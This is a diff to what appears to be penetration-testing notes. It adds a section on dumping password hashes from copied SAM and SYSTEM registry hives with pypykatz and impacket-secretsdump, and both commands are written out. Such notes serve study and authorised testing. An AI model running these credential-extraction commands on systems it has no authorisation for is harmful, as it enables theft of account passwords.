@@ -106,4 +106,12 @@
 
 ### Then download all of them to our machine
 
+## Dump hashes
 
+### 1) Pypykatz
+
+ - pypykatz registry --sam sam system
+
+### 2) impacket-secretsdump
+
+ - impacket-secretsdump -sam sam -system system LOCAL
